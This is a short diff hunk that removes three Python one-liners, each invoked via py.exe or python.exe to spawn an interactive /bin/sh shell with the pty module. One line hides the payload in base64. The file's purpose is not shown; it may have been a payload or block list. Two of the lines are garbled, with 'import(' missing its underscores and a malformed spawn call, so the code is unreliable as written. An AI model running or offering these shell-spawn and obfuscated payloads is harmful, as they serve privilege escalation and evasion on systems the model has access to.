@@ -1,3 +1,0 @@
-py.exe -c "import pty; pty.spawn('/bin/sh')"
-python.exe -c "exec(import('base64').b64decode('aW1wb3J0IHB0eTsgcHR5LnNwYXduKCIvYmluL3NoIik='))"
-python.exe -c "import('pty').dict'spawn'"
